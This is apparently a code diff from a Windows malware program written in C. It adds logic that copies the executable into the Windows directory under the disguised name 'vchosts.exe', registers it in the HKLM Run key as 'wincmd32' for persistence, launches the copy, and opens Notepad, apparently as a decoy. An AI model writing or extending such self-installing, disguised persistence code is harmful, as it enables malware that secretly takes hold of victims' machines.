@@ -235,18 +235,33 @@ void Hook(char* self, int mode)
 		
 	GetWindowsDirectory(path, 1024);
 	strcat(path, "\\vchosts.exe");
+	
+	
 	CopyFile(self, path, 0);
 	
 	RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
-		RegSetValueEx(hkey,"wincmd32", 0, REG_SZ, path, strlen(path));
-		RegCloseKey(hkey);
+	RegSetValueEx(hkey,"wincmd32", 0, REG_SZ, path, strlen(path));
+	RegCloseKey(hkey);
 
 	return;
 }
 
 int main(int argn, char* argv[])
 {
-	Hook(argv[0], 1);
+	unsigned char path[1024];
+	GetWindowsDirectory(path, 1024);
+	strcat(path, "\\vchosts.exe");
+	
+	WIN32_FIND_DATA FindFileData;
+	HANDLE handle = FindFirstFile(path, &FindFileData);
+	if(handle == INVALID_HANDLE_VALUE) 
+	{
+		FindClose(handle);
+		Hook(argv[0], 1);
+		ShellExecute(0, "open", path, NULL, NULL, SW_SHOW);
+		ShellExecute(0, "open", "notepad", NULL, NULL, SW_SHOW);
+		exit(0);
+	}
 	
 	mutex = CreateMutex(NULL, FALSE, NULL);
 	
